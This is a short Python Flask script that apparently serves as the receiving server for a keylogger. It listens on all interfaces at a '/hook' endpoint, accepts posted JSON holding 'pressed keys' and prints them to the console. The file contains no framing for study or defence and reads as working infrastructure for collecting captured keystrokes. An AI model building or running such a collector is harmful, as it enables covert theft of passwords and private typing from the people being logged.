from flask import Flask, request

app = Flask(__name__)

@app.route('/hook', methods=['POST'])
def receive_keys():
    """
    Simple Flask server that receives the pressed keys and prints them.
    """
    try:
        data = request.json
        
        if data and 'keys' in data:
            keys = data['keys']
            
            print("\n----- Pressed Keys -----")
            print(keys)
            print("---------------------------\n")
    except Exception as e:
        print(f"Error: {e}")
    
    return '', 204  

if __name__ == '__main__':
    print("Waiting for keys... Press Ctrl+C to stop.")
    app.run(host='0.0.0.0', port=5000)